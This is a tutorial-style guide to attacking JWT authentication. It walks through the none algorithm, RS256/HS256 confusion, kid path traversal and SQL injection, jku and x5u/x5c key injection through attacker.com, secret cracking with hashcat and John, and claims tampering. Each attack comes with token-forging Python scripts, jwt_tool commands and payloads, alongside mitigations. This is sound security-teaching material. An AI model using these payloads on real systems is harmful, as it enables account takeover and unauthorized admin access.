# Complete JWT Exploitation Methodologies



## Methodology 1: None Algorithm Attack (CVE-2015-9235)

### Vulnerability Overview

The "none" algorithm attack exploits a critical design flaw in JWT libraries where the server accepts tokens with `"alg": "none"` in the header, completely bypassing signature validation. This vulnerability was formally documented as CVE-2015-9235 in the popular `jsonwebtoken` npm library, affecting versions 4.2.1 and earlier.

**How It Works:** The JWT specification allows the "none" algorithm for situations where the token is intentionally unsigned. Some libraries incorrectly treat this as a valid signature verification option, allowing attackers to forge arbitrary tokens without knowing any secret.

### Real-World Impact

In 2015, Auth0 disclosed critical vulnerabilities in multiple JWT libraries, including `jsonwebtoken`, `jwt-simple`, and `njwt`. Attackers could forge admin tokens with `alg: "none"` and gain unauthorized access to applications relying on these libraries.

### Step-by-Step Exploitation

#### Step 1: Capture a Valid JWT

First, intercept a legitimate JWT token from the target application using Burp Suite:

1. Configure Burp Suite as a proxy
2. Log into the application normally
3. Capture any authenticated request containing a JWT in the `Authorization` header or cookie

#### Step 2: Decode the JWT

Use jwt.io or Burp Suite's JWT Editor to examine the token structure:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsInVzZXIiOiJqb2huIn0.signature
```

Decoded header:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Decoded payload:
```json
{
  "role": "user",
  "user": "john"
}
```

#### Step 3: Modify Header and Payload

Change the algorithm to "none" and escalate privileges:

```json
// Modified header
{
  "alg": "none",
  "typ": "JWT"
}

// Modified payload
{
  "role": "admin",
  "user": "administrator"
}
```

#### Step 4: Generate Forged Token Using Python

```python
import jwt

payload = {
    "role": "admin",
    "user": "administrator",
    "exp": 9999999999
}

# Sign with algorithm="none" - signature is empty
token = jwt.encode(payload, None, algorithm="none")
print(token)
```

**Critical Note:** The resulting token will have an empty signature section (just a trailing dot). Some libraries require the signature section to be present but can be left empty.

#### Step 5: Send Forged Token in Burp Suite

1. In Burp Repeater, replace the existing JWT with your forged token
2. Send the request to the protected endpoint (e.g., `/admin`, `/api/users`)
3. If vulnerable, the server accepts the token and grants admin access

### Testing with jwt_tool

```bash
# Automated none algorithm attack
python3 jwt_tool.py <JWT> -X a

# This will try various none algorithm bypasses
```

### Detection Indicators

An application is vulnerable to none algorithm attacks if:
- The server accepts tokens with `alg: "none"`
- The server processes requests without validating the signature section
- Different error messages appear between invalid signature and missing signature

### Mitigation

Update to patched library versions:
- `jsonwebtoken` >= 4.2.2
- Explicitly reject tokens with `alg: "none"`
- Configure JWT validation to enforce specific algorithms


## Methodology 2: Algorithm Confusion (RS256 to HS256)

### Vulnerability Overview

Algorithm confusion, also known as key confusion, occurs when a server expects RSA signatures (asymmetric) but an attacker changes the algorithm to HMAC (symmetric). The vulnerable library attempts to verify the signature using the RSA public key as an HMAC secret, which the attacker can use to sign arbitrary tokens.

### Real-World Case Study: CVE-2023-48223

In November 2023, a critical algorithm confusion vulnerability was discovered in `fast-jwt` library versions prior to 3.3.2. The `publicKeyPemMatcher` function failed to properly match all common PEM public key formats, specifically those containing the `BEGIN RSA PUBLIC KEY` header.

**Affected Scenario:** Applications using RS256 algorithm with public keys containing `BEGIN RSA PUBLIC KEY` header and calling the verify function without explicitly providing an algorithm.

### Prerequisites for Exploitation

- The server must use RS256 (or other asymmetric algorithm)
- You must obtain the server's public key
- The library must not enforce algorithm restrictions

### Step-by-Step Exploitation

#### Step 1: Obtain the Public Key

**Method A: Extract from X.509 Certificate**

```bash
# Connect to server and extract certificate
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem

# View the public key
cat public.pem
```

**Method B: Recover Public Key from Two JWTs**

Use the `rsa_sign2n` tool to derive the RSA public key from two different JWT tokens signed with the same key:

```bash
# Clone the tool
git clone https://github.com/silentsignal/rsa_sign2n.git

# Recover public key
python3 jwt_forgery.py token1 token2
```

This generates 4 different public key formats. Test each one in the next steps.

**Method C: Check for Exposed JWKS Endpoint**

Common endpoints to check:
- `/.well-known/jwks.json`
- `/jwks`
- `/oauth/jwks`

#### Step 2: Create Forged Token Using Public Key as HMAC Secret

**Using jwt_tool:**

```bash
python3 jwt_tool.py <ORIGINAL_JWT> -S hs256 -k public.pem
```

**Using Python:**

```python
import jwt

# Read the public key
with open('public.pem', 'r') as f:
    public_key = f.read()

# Create malicious payload
payload = {
    "user": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# Sign with HS256 using the RSA public key as the HMAC secret
forged_token = jwt.encode(payload, public_key, algorithm="HS256")
print(forged_token)
```

#### Step 3: Test the Forged Token

1. In Burp Suite, replace the original JWT with your forged token
2. Send the request to a protected endpoint
3. If the server accepts it, the algorithm confusion attack succeeded

### Full Exploitation with Proof of Concept

The following vulnerable server code demonstrates the attack surface:

```javascript
// Vulnerable server code
const express = require('express');
const { createSigner, createVerifier } = require('fast-jwt');

app.get('/generateToken', async (req, res) => {
  const payload = { admin: false, name: req.query.name };
  const signSync = createSigner({ algorithm: 'RS256', key: privateKey });
  const token = signSync(payload);
  res.json({ token });
});

function verifyToken(req, res, next) {
  const token = req.query.token;
  // VULNERABLE: No algorithm whitelist
  const verifySync = createVerifier({ key: publicKey });
  const payload = verifySync(token);
  req.decoded = payload;
  next();
}
```

To exploit this:

```bash
# Step 1: Generate two tokens from the server
curl "http://vulnerable.com/generateToken?name=user1" > token1.txt
curl "http://vulnerable.com/generateToken?name=user2" > token2.txt

# Step 2: Recover public key
python3 jwt_forgery.py token1.txt token2.txt > public_key.pem

# Step 3: Forge admin token
python3 jwt_tool.py token1.txt -S hs256 -k public_key.pem -I -pc admin -pv true

# Step 4: Access protected endpoint
curl "http://vulnerable.com/checkAdmin?token=<FORGED_TOKEN>"
```

### Testing with Burp Suite JWT Editor

1. Install JWT Editor extension from BApp Store
2. Capture a request containing a JWT
3. Go to the JWT Editor tab
4. Change the algorithm from `RS256` to `HS256`
5. For the signing key, paste the public key (from `public.pem`)
6. Modify the payload claims (e.g., change `"admin": false` to `"admin": true`)
7. Sign the token and send the request

### Detection Methodology

An application is vulnerable to algorithm confusion if:
- The server accepts tokens where algorithm was changed from RS256 to HS256
- The JWT validation library does not enforce algorithm whitelisting
- The server's public key is accessible (through JWKS endpoint, certificate, or recovery)

### Mitigation

```javascript
// Secure implementation with algorithm whitelist
const verifySync = createVerifier({
  key: publicKey,
  algorithms: ['RS256']  // Explicitly whitelist algorithms
});
```

Update to patched versions (fast-jwt >= 3.3.2) which properly match PEM formats using regex:
```javascript
const publicKeyPemMatcher = /^-----BEGIN( RSA)? PUBLIC KEY-----/
```


## Methodology 3: Kid Header Path Traversal

### Vulnerability Overview

The `kid` (Key ID) header parameter tells the server which key to use for verification. When servers use this value to construct file paths for key retrieval without sanitization, path traversal becomes possible.

### Vulnerable Code Pattern

```javascript
// VULNERABLE: Direct file path concatenation
const key = fs.readFileSync(`/keys/${kid}.pem`);
```

If `kid` is user-controlled, an attacker can use `../../../` sequences to read arbitrary files.

### PortSwigger Lab Walkthrough

This exact vulnerability appears in PortSwigger's Web Security Academy Lab: "JWT authentication bypass via kid header path traversal".

### Step-by-Step Exploitation

#### Step 1: Generate a Symmetric Key with Null Value

The attack uses `/dev/null` (which returns empty content) as the key file. The Base64 representation of a null byte is `AA==`.

**In Burp Suite with JWT Editor:**

1. Go to the **JWT Editor Keys** tab
2. Click **New Symmetric Key**
3. Click **Generate** to create a key in JWK format
4. Replace the `k` property value with `AA==` (Base64 for a null byte)
5. Click **OK** to save

**Alternative - Using jwt_tool:**

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../dev/null" -S hs256 -p ""
```

#### Step 2: Modify the JWT

1. Capture an authenticated request in Burp Repeater
2. Switch to the **JSON Web Token** tab (provided by JWT Editor)
3. In the header section, locate the `kid` parameter
4. Change the `kid` value to traverse to `/dev/null`:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

5. In the payload section, change the `sub` claim (or relevant privilege claim) to `administrator`:

```json
{
  "sub": "administrator",
  "exp": 9999999999
}
```

#### Step 3: Sign and Send

1. At the bottom of the JWT Editor tab, click **Sign**
2. Select the symmetric key you created (with `AA==` value)
3. Select **Don't modify header** option
4. Click **OK**

The token is now signed using a null byte as the secret key (because the server will read `/dev/null` which is empty).

#### Step 4: Access Protected Endpoint

Change the request path to `/admin` or another protected endpoint and send. The server:
1. Reads the `kid` value
2. Opens `/keys/../../../../../../../dev/null` → `/dev/null`
3. Reads empty content as the verification key
4. Successfully verifies your null-signed token
5. Grants admin access

### Advanced Kid Manipulation Techniques

**Using Known File Contents:**

If you know the contents of a specific file, you can use that as the key:

```bash
# Use /etc/passwd as key (you know its format)
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../etc/passwd" -S hs256 -p "root:x:0:0:root:/root:/bin/bash"
```

**SQL Injection in Kid:**

When the `kid` is used in database queries:

```json
{
  "alg": "HS256",
  "kid": "1' UNION SELECT 'known_secret' --"
}
```

This modifies the SQL query to return your known secret as the key.

### Testing Methodology

1. **Identify kid usage:** Check if JWT headers contain a `kid` parameter
2. **Test path traversal:** Try `../../../dev/null`, `../../../../etc/passwd`, `..\..\..\windows\win.ini`
3. **Observe error differences:** Different errors for missing vs. invalid keys indicate vulnerability
4. **Exploit with null key:** Use `AA==` as the secret after pointing to `/dev/null`

### Mitigation

```javascript
// Secure implementation
const allowedKeys = ['key-1', 'key-2', 'key-3'];
if (!allowedKeys.includes(kid)) {
  throw new Error('Invalid key ID');
}
// Or use a mapping instead of file path concatenation
const key = keyMap[kid];
```


## Methodology 4: JKU (JWK Set URL) Injection

### Vulnerability Overview

The `jku` header parameter specifies a URL where the server can fetch the JSON Web Key Set (JWKS) containing verification keys. When not validated against a whitelist, attackers can host their own JWKS and sign tokens with their private keys.

### JWT Header with JKU

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "kid": "malicious-key"
}
```

The server fetches the JWKS from the attacker's URL and uses the specified public key to verify the token.

### Step-by-Step Exploitation

#### Step 1: Generate an RSA Key Pair

```bash
# Generate private key
openssl genrsa -out private.pem 2048

# Extract public key
openssl rsa -in private.pem -pubout -out public.pem
```

#### Step 2: Create a JWKS File

Create `jwks.json` with the following structure:

```json
{
  "keys": [
    {
      "kid": "malicious-key",
      "kty": "RSA",
      "n": "BASE64URL_ENCODED_MODULUS",
      "e": "AQAB"
    }
  ]
}
```

To get the correct `n` (modulus) value from your public key:

```bash
# Extract modulus from public key
openssl rsa -pubin -in public.pem -modulus -noout | cut -d'=' -f2
```

#### Step 3: Host the JWKS File

```bash
# Start a simple HTTP server
python3 -m http.server 8080

# Or use ngrok for external access
ngrok http 8080
```

#### Step 4: Create and Sign the Malicious JWT

**Using jwt_tool:**

```bash
python3 jwt_tool.py <JWT> -X s -ju "https://attacker.com/jwks.json" -pr private.pem
```

**Using Burp Suite JWT Editor:**

1. In the JWT Editor tab, locate the `jku` header
2. Change it to your hosted JWKS URL
3. Modify the payload claims (e.g., change user to admin)
4. Sign using your private key (import it into JWT Editor first)
5. Send the request

#### Step 5: Verify the Attack

Monitor your HTTP server logs. When the target server validates the JWT, it will make a request to your `jwks.json` URL.

### Real-World Attack Flow

```
Attacker -> Generates RSA key pair
Attacker -> Creates JWKS with public key
Attacker -> Hosts JWKS on attacker.com/jwks.json
Attacker -> Creates JWT with {"jku": "https://attacker.com/jwks.json"}
Attacker -> Signs JWT with private key
Attacker -> Sends JWT to target server

Target Server -> Receives JWT
Target Server -> Reads jku header
Target Server -> Fetches https://attacker.com/jwks.json
Target Server -> Uses attacker's public key from JWKS
Target Server -> Verifies signature (SUCCESS!)
Target Server -> Grants access based on forged claims
```

### Testing Methodology

1. **Check for jku support:** Insert a `jku` header pointing to a URL you control
2. **Monitor requests:** Check if your server receives a request from the target
3. **Exploit if vulnerable:** Host a valid JWKS and sign tokens with your private key

### Mitigation

- Disable `jku` header support entirely if not needed
- Implement strict whitelist of allowed JWKS URLs
- Validate the entire URL including protocol, domain, and path
- Use `trustedJwks` configuration instead of allowing arbitrary URLs


## Methodology 5: X5U and X5C Header Injection

### Vulnerability Overview

The `x5u` (X.509 URL) header provides a URI to an X.509 certificate, while `x5c` (X.509 Certificate Chain) embeds the certificate directly in the header. If the server trusts these headers for signature verification, attackers can supply their own certificates.

### Real-World Attack from TrustedSec (2025)

In June 2025, TrustedSec published a detailed analysis of JWT attacks using X.509 certificates, demonstrating how both `x5u` and `x5c` headers can be exploited to achieve full authentication bypass.

### Step-by-Step Exploitation

#### Step 1: Generate Attacker Certificate

```bash
openssl req -newkey rsa:2048 -nodes -keyout private_key.pem -x509 -days 365 -out cert.pem
```

This creates:
- `private_key.pem` - Your private key for signing
- `cert.pem` - Your X.509 certificate containing the public key

#### Step 2: Attack Using X5C (Embedded Certificate)

The `x5c` header contains the Base64-encoded certificate directly in the JWT.

**Using TrustedSec's Burp Extension:**

1. Load the `JWT_x509_Re-Sign.py` extension in Burp (requires Jython)
2. Capture a request with a JWT and navigate to the **Re-sign JWT** tab
3. Click **Decode** to view the token header and claims
4. Modify the `sub` claim (or any privilege claim) to `root` or `administrator`
5. Import your X.509 private key and certificate
6. Select **Re-sign with x5c header** and click **Attack!**

The extension automatically:
- Encodes your certificate for the `x5c` header
- Signs the token with your private key
- Updates the request with the forged token

**Manual X5C Attack:**

```python
import jwt
import base64

# Load certificate
with open('cert.pem', 'rb') as f:
    cert_der = f.read()
    cert_b64 = base64.b64encode(cert_der).decode()

# Create header with x5c
header = {
    "alg": "RS256",
    "typ": "JWT",
    "x5c": [cert_b64]
}

# Create malicious payload
payload = {
    "sub": "administrator",
    "admin": True,
    "exp": 9999999999
}

# Sign with private key
with open('private_key.pem', 'r') as f:
    private_key = f.read()

token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
```

#### Step 3: Attack Using X5U (Certificate URL)

The `x5u` header points to a URL where the certificate can be fetched.

**Setup:**

1. Host your `cert.pem` on a web server:

```bash
cp cert.pem /var/www/html/
sudo systemctl start apache2
```

2. In Burp with the TrustedSec extension:
   - Modify the claims as desired
   - Select **Re-sign with x5u header**
   - Enter your certificate URL (e.g., `https://attacker.com/cert.pem`)
   - Click **Attack!**

**Verification:** Monitor your web server logs. If the target server requests `cert.pem`, the attack is working:

```
GET /cert.pem HTTP/1.1
Host: attacker.com
User-Agent: Python-urllib/3.x
```

#### Step 4: Send the Forged Request

After resigning, send the request to the protected endpoint. A successful attack returns `200 OK` with the forged claims processed by the server.

### TrustedSec Extension Features

The custom Burp extension automates the entire process:
- Base64 decoding of JWT headers and claims
- Modification of any claim values
- Import of X.509 private keys and certificates
- Automatic insertion of `x5c` or `x5u` headers
- Re-signing of tokens with attacker's key

### Testing Methodology

1. **Identify x5 support:** Check if JWT headers accept `x5c` or `x5u` parameters
2. **Test injection:** Add an `x5u` header pointing to your server
3. **Check for external requests:** Monitor if your server receives requests
4. **Exploit if vulnerable:** Use your own certificate to sign forged tokens

### Why This Works

The vulnerability exists because the server trusts the certificate provided in the header for signature verification, rather than using a pre-configured, trusted certificate.

**Secure vs. Vulnerable Verification:**

```
VULNERABLE: Server uses whatever certificate the JWT provides
SECURE: Server uses only pre-configured, trusted certificates
```

### Mitigation

```javascript
// Secure implementation - ignore x5 headers
const verifyOptions = {
  algorithms: ['RS256'],
  // Do NOT process x5c or x5u headers
  ignoreX5C: true,
  ignoreX5U: true
};
```


## Methodology 6: Weak HMAC Secret Cracking

### Vulnerability Overview

When applications use HS256 (symmetric HMAC) with weak secrets, attackers can perform offline brute-force attacks to recover the secret and forge arbitrary tokens.

### Step-by-Step Cracking with John the Ripper

#### Step 1: Extract the JWT

Capture a valid JWT token from the application:

```bash
# Save token to file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > token.txt
```

#### Step 2: Identify the Algorithm

Decode the JWT header to confirm it uses HS256:

```bash
# Decode with jwt-cli or online at jwt.io
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}
```

#### Step 3: Crack with John the Ripper

John the Ripper natively supports JWT format with the HMAC-SHA256 format:

```bash
# Basic dictionary attack
john token.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt

# With rules for mutations
john token.txt --format=HMAC-SHA256 --wordlist=rockyou.txt --rules=best64

# Show cracked password
john token.txt --show
```

**Expected Output:**

```
Loaded 1 password hash (HMAC-SHA256 [password is HMAC secret])
secret123        (token.txt)
```

#### Step 4: Crack with Hashcat

```bash
# Dictionary attack with rockyou
hashcat -m 16500 -a 0 token.txt /usr/share/wordlists/rockyou.txt

# Brute force - all lowercase letters, length 6-8
hashcat -m 16500 -a 3 --increment token.txt ?l?l?l?l?l?l?l?l

# Rule-based attack
hashcat -m 16500 -a 0 token.txt rockyou.txt -r rules/best64.rule

# Show cracked result
hashcat -m 16500 token.txt --show
```

### Step-by-Step Cracking with jwt_tool

```bash
# Dictionary attack
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# With custom wordlist
python3 jwt_tool.py <JWT> -C -d secrets.txt
```

### Using the Cracked Secret

Once you have the secret, forge new tokens:

**Using jwt.io:**
1. Paste the original JWT
2. Change the payload claims (e.g., `"role": "admin"`)
3. Enter the cracked secret in the "Verify Signature" section
4. Copy the newly signed token

**Using Python:**

```python
import jwt

secret = "secret123"  # The cracked secret

payload = {
    "user": "admin",
    "role": "administrator",
    "exp": 9999999999
}

forged_token = jwt.encode(payload, secret, algorithm="HS256")
print(forged_token)
```

### Secret Strength Analysis

| Secret Type | Cracking Time (GTX 1080) |
|-------------|-------------------------|
| 6-digit number | Instant |
| Common word from rockyou | Seconds |
| 8-character lowercase | Minutes to hours |
| 12-character random | Centuries |
| 32-byte random (proper) | Impractical |

### Testing Methodology

1. **Check algorithm type:** Look for HS256 in JWT header
2. **Attempt weak secret:** Try common secrets like `secret`, `password`, `changeme`
3. **Run dictionary attack:** Use rockyou.txt against captured token
4. **Try brute force:** For short secrets (6-8 characters)

### Real-World Considerations

Some applications use predictable secrets:
- Application name + year (e.g., `myapp2024`)
- Company name variations
- Default framework secrets (Django `SECRET_KEY` patterns, Rails `secret_key_base`)

### Mitigation

- Use cryptographically random secrets (minimum 32 bytes)
- Generate with: `openssl rand -base64 32`
- Use asymmetric algorithms (RS256, ES256) instead of HS256
- Implement secret rotation policies
- Store secrets in secure vaults, not in code


## Methodology 7: JWT Claims Manipulation

### Overview

Even without cryptographic vulnerabilities, applications often trust JWT claims implicitly without proper validation, leading to privilege escalation.

### Common Vulnerable Claims

```json
{
  "user_id": 123,
  "username": "john",
  "role": "user",
  "admin": false,
  "group": "standard",
  "email": "john@example.com"
}
```

### Testing Approach

#### 1. Modify User Identifier Claims

Change any user identification fields:

```json
{
  "user_id": 1,
  "username": "administrator",
  "email": "admin@example.com"
}
```

#### 2. Modify Privilege Claims

Look for role or permission fields:

```json
{
  "role": "admin",
  "admin": true,
  "is_admin": true,
  "permissions": ["*"],
  "group": "administrators"
}
```

#### 3. Modify Expiration Claims

Extend token lifetime or remove expiration:

```json
{
  "exp": 9999999999,
  "nbf": 0
}
```

### Testing with Burp Suite

1. Capture a request with JWT
2. Go to JWT Editor tab
3. Decode the token
4. Modify claim values
5. If the original token had a signature, you need to re-sign:
   - For HS256: Crack the secret or use known secret
   - For RS256: Need private key or algorithm confusion
6. Send the modified token

### Testing Without Signature (Vulnerable Applications)

Some applications do not validate signatures at all. Test by:

1. Decoding the JWT
2. Modifying claims
3. Changing the signature to anything (or removing it)
4. Sending the request

If the server accepts the token, signature validation is completely broken.

### Real-World Example

```bash
# Original JWT giving user access
Original: {"user": "john", "role": "user"}

# Modified JWT attempting admin access
Modified: {"user": "john", "role": "admin"}

# If server doesn't validate signature properly
# OR if you have the valid secret/key
# You gain admin access
```


## Comprehensive Testing Checklist

### Initial Reconnaissance
- [ ] Decode JWT and examine all claims
- [ ] Identify algorithm (HS256, RS256, ES256, none)
- [ ] Check for kid, jku, x5u, x5c headers
- [ ] Determine if JWKS endpoint is exposed (`/.well-known/jwks.json`)

### Cryptographic Attacks
- [ ] Test none algorithm (`alg: "none"`)
- [ ] Test RS256 to HS256 algorithm confusion
- [ ] Attempt HMAC secret cracking (HS256 only)
- [ ] Test for key ID injection (path traversal, SQLi)

### Header Injection Attacks
- [ ] Test jku header with attacker-controlled JWKS
- [ ] Test x5u header with attacker-controlled certificate
- [ ] Test x5c header with embedded attacker certificate

### Claims Manipulation
- [ ] Modify user identifier claims
- [ ] Modify role/permission claims
- [ ] Modify expiration claims (exp, nbf)
- [ ] Test SQL injection in claims

### Validation Testing
- [ ] Test token acceptance after session logout
- [ ] Test token replay across different endpoints
- [ ] Test with invalid signature (should reject)
- [ ] Test with missing signature (should reject for alg != none)
- [ ] Test with expired token (should reject)

### Tool Workflow Summary

| Phase | Tools |
|-------|-------|
| Intercept | Burp Suite |
| Decode | jwt.io, jwt_tool -d |
| Modify | JWT Editor (Burp), jwt_tool -I |
| Crack | hashcat, john, jwt_tool -C |
| Exploit | jwt_tool, custom Python scripts |
| Verify | Burp Repeater, curl |


## References

1. CVE-2015-9235: jsonwebtoken verification bypass - GitHub Advisory Database
2. CVE-2023-48223: fast-jwt algorithm confusion - GitHub Advisory Database
3. JWT Attack Methodology - PortSwigger Web Security Academy
4. JWT Key Confusion Attack - PentesterLab Glossary
5. JWT X.509 Certificate Attacks - TrustedSec (June 2025)
6. JWT Secret Cracking with John the Ripper - Hakatemia
